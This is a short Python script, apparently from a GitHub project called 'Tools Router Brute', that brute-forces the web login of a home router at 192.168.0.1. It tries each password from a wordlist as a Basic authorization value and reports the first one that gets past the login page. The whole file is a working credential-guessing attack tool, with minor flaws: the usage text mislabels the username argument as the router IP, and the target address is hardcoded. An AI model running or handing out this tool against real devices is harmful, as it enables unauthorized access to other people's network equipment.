#!/usr/bin/python

import requests as r
import base64
import sys
import os

def splash():

    print(
    """
        TOOLS ROUTER BRUTE - V1.0.0
        Site: https://www.github.com/WalderlanSena/toolsrouterbrute
        Developement: Walderlan Sena <contato@mentesvirtuaissena.com>
    """
    )

if len(sys.argv) < 2:
    splash();
    print("\tUsage: trb.py IPRouter wordlist\n\n")
    exit(1)


os.system('setterm -cursor off')

def main():
    wordlist = open(sys.argv[2], 'r')
    count = 0
    for i in wordlist:

        login = str(sys.argv[1])
        senha = i.rstrip()
        auth  = "Basic "

        authEncode = auth+base64.b64encode(login+':'+senha)

        cookie = {"Authorization": authEncode}

        response = r.get("http://192.168.0.1", cookies=cookie)

        if response.content.count('id="userName"') != 1:
            os.system('setterm -cursor off')
            print('\n\tPassword Found =====> ' + senha)
            exit(0)
        else:
            os.system("clear")
            splash()
            count = count + 1
            print('\t[ '+ str(count) + ' ] Password not found ===> ' + senha)

if __name__ == "__main__":

    try:
        main();
    except KeyboardInterrupt:
        os.system('setterm -cursor off')
        print("\nOperation canceled ! :(\n")
